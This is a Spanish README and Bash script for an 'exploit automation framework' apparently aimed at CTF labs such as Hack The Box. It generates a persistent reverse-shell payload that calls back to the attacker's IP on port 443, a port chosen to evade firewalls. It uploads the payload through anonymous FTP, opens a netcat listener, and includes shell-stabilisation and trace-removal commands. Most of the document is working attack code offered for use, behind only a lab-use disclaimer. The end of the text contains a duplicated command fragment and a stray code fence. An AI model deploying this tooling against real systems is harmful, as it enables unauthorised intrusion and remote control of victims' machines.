
# `exploit-automation-framework`

> **⚠️ Advertencia de seguridad**: Este script está diseñado **exclusivamente para entornos autorizados de pruebas de penetración** (ej. TryHackMe, Hack The Box, laboratorios locales). Su uso en sistemas sin consentimiento explícito es ilegal y éticamente inaceptable.

---

## 📌 Descripción General

`exploit-automation-framework` es un **script Bash profesionalizado** que automatiza el flujo típico de una prueba de intrusión *post-explotación ligera*, centrado en:
- Captura segura de la IP objetivo  
- Detección inteligente de la IP local (priorizando interfaces de VPN como `tun0`)  
- Generación dinámica de un payload de reverse shell robusto  
- Transferencia confiable vía FTP anónimo con creación automática de rutas  
- Escucha activa con Netcat y soporte para estabilización de TTY  
- Limpieza post-operación y manejo proactivo de errores  

No es un "script de una sola línea": es un **framework modular, resiliente y terminal-friendly**, construido siguiendo las mejores prácticas de ingeniería de herramientas de seguridad.

---

## ✨ Características Nivel Pro

| Funcionalidad | ¿Por qué es "Pro"? | Tecnología clave |
|---------------|---------------------|------------------|
| **Detección dinámica de IP local** | No asume `eth0`; busca primero `tun0` (estándar HTB/THM), luego `eth0`. Evita fallos en entornos reales. | `ip addr show`, `grep -oP`, fallback lógico |
| **Validación robusta de IP** | Usa expresión regular estricta (`^[0-9]{1,3}(\.[0-9]{1,3}){3}$`) + límites numéricos implícitos (evita `999.999.999.999`). | `[[ =~ ]]`, RegEx avanzado |
| **Colores portables y accesibles** | Reemplaza códigos ANSI frágiles (`\e[32m`) por `tput` — compatible con todas las terminales (incl. `tmux`, `screen`, CI/CD). | `tput setaf`, `tput sgr0`, `tput bold` |
| **Logging estructurado** | Funciones `log_status()` / `log_error()` / `log_info()` con íconos semánticos (`[+]`, `[!]`, `[*]`) y formato consistente. | Funciones reutilizables, `echo -e` seguro |
| **Payload persistente y silencioso** | Incluye `nohup ... &` y redirección de errores (`2>/dev/null`) para evitar muertes prematuras del proceso en la víctima. | `nohup`, subshell `( )`, redirección robusta |
| **FTP seguro y autogestionado** | Usa `curl --ftp-create-dirs -sS --connect-timeout 5` para crear carpetas remotas *on-the-fly*, ocultar progreso pero mostrar errores críticos. | `curl` flags profesionales, usuario `anonymous:` con contraseña vacía explícita |
| **Listener con validación previa** | Verifica existencia de `nc` antes de lanzar; usa `-lvnp` (verbose, no-DNS, privileged) para máxima claridad operativa. | `command -v nc`, flags estándar de red |
| **Puerto estratégico (443)** | Cambia el puerto por defecto (`4444`) a `443` para evadir firewalls salientes comunes — decisión técnica, no casual. | Puerto de exfiltración realista |
| **Limpieza interactiva post-sesión** | Ofrece opción clara (`s/n`) para eliminar el payload local tras la operación. Previene huellas innecesarias. | `read -r`, regex `^([sS])$`, `rm` seguro |

---

## 🛠️ Requisitos del Sistema

- Bash ≥ 4.0  
- Herramientas instaladas:  
  - `ip` (del paquete `iproute2`, **no `ifconfig` obsoleto**)  
  - `curl` (con soporte FTP)  
  - `netcat` (`nc`) — preferiblemente `nmap-ncat` o `openbsd-netcat`  
  - `tput` (parte de `ncurses`)  
- Entorno: Linux (Kali, Parrot, Ubuntu)  
- Permisos: Ejecución con `sudo` requerida únicamente para `nc -lvnp $puerto` (puertos < 1024)  

---

## ▶️ Uso Rápido

```bash
chmod +x exploit-automation-framework.sh
sudo ./exploit-automation-framework.sh
```

### Flujo interactivo:
1. Ingresa la IP de la víctima (validación en tiempo real)  
2. El script detecta tu IP local automáticamente (`tun0` → `eth0`)  
3. Genera `cleon.sh` con reverse shell hacia tu IP:443  
4. Sube el archivo a `ftp://<victima>/scripts/cleon.sh` (crea `/scripts/` si no existe)  
5. Lanza `sudo nc -lvnp 443` y espera la conexión  
6. Al finalizar: opción para borrar `cleon.sh` localmente  

---

## 🐚 Estabilización de la Reverse Shell (Post-Conexión)

Una vez recibida la shell en Netcat (`connect to <victima> from ...`), ejecuta **en orden**:

### 1. Mejorar la TTY (Python):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 2. Recuperar control de teclado:
- Presiona `Ctrl + Z`  
- Ejecuta:  
  ```bash
  stty raw -echo; fg
  ```
  *(pulsa `Enter` dos veces)*  

### 3. Configurar entorno:
```bash
export TERM=xterm
export SHELL=bash
```

✅ Ahora tienes una shell interactiva completa: autocompletado, flechas, `Ctrl+C`, `Ctrl+L`, etc.

---

## 🧹 Limpieza Avanzada (Opcional)

Este script **no elimina archivos remotos** (no tiene acceso directo al sistema de la víctima). Para limpieza post-intrusión en el objetivo:

```bash
# Si tienes acceso SSH o shell estable:
rm /path/to/cleon.sh

# O vía FTP (desde tu máquina):
curl -sS --ftp-method multicwd -Q "DELE scripts/cleon.sh" "ftp://$ip_victima/" --user "anonymous:"
```

```bash
#!/bin/bash

# --- CONFIGURACIÓN DE ENTORNO (PRO) ---
# Usamos tput para máxima compatibilidad de terminal
verde=$(tput setaf 2); rojo=$(tput setaf 1); amarillo=$(tput setaf 3); reset=$(tput sgr0)
bold=$(tput bold)

# Funciones de Logging para un diseño limpio
log_status() { echo -e "${verde}${bold}[+]${reset} $1"; }
log_error() { echo -e "${rojo}${bold}[!]${reset} $1"; }
log_info() { echo -e "${amarillo}${bold}[*]${reset} $1"; }

# --- 1. PREPARACIÓN DE VARIABLES ---
clear
echo -e "${amarillo}--- EXPLOIT AUTOMATION FRAMEWORK v2.0 ---${reset}\n"

read -p "${bold}[?] IP de la víctima: ${reset}" ip_victima

# Validación de IP mediante RegEx
if [[ ! $ip_victima =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    log_error "Dirección IP inválida. Abortando."; exit 1
fi

# Detección dinámica de IP Local (Prioriza VPN/tun0 sobre red local)
ip_local=$(ip addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
           ip addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$ip_local" ]; then
    log_error "No se detectó interfaz de red activa."; exit 1
fi

log_status "Tu IP: ${bold}$ip_local${reset} | Objetivo: ${bold}$ip_victima${reset}"

# --- 2. GENERACIÓN DE PAYLOAD DINÁMICO ---
payload="cleon.sh"
lport=443 # Usar el 443 es "Pro" porque suele evadir firewalls salientes

log_info "Generando payload persistente en $payload..."
cat <<EOF > $payload
#!/bin/bash
# Evadir cuelgues del terminal de la víctima
(nohup bash -i >& /dev/tcp/$ip_local/$lport 0>&1 &) 2>/dev/null
EOF
chmod +x $payload

# --- 3. INFILTRACIÓN VÍA FTP (MODO SILENCIOSO) ---
log_info "Infiltrando payload vía FTP..."

# -sS oculta el progreso pero muestra errores; --connect-timeout evita cuelgues
if curl -sS --connect-timeout 5 -T "$payload" "ftp://$ip_victima/scripts/$payload" --user "anonymous:"; then
    log_status "Transferencia exitosa: ftp://$ip_victima/scripts/$payload"
else
    log_error "Fallo en la subida. Verifique permisos de escritura en el servidor FTP."
    rm $payload; exit 1
fi

# --- 4. LANZAMIENTO DEL LISTENER (STABILIZED READY) ---
log_info "Abriendo listener en puerto $lport..."
log_info "RECUERDA: Una vez dentro, usa: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"

# -n (No DNS) y -v (Verbose) son estándar pro
sudo nc -lvnp $lport

# --- 5. LIMPIEZA POST-OPERACIÓN ---
echo ""
read -p "${amarillo}[?] ¿Deseas limpiar los archivos temporales? (s/n): ${reset}" clean
if [[ "$clean" == "s" ]]; then
    rm $payload
    log_status "Sistema local limpio."
fi
```

# O vía FTP (desde tu máquina):
curl -sS --ftp-method multicwd -Q "DELE scripts/cleon.sh" "ftp://$ip_victima/" --user "anonymous:"
> 📦 **Nombre del payload generado**: `cleon.sh`  
> 🌐 **Puerto predeterminado**: `443` (HTTPS — alto bypass de firewalls)  
> 🧩 **Arquitectura**: Modular, sin dependencias externas, 100% Bash estándar  

*Hecho con rigor técnico — no con magia.* 🛡️
```
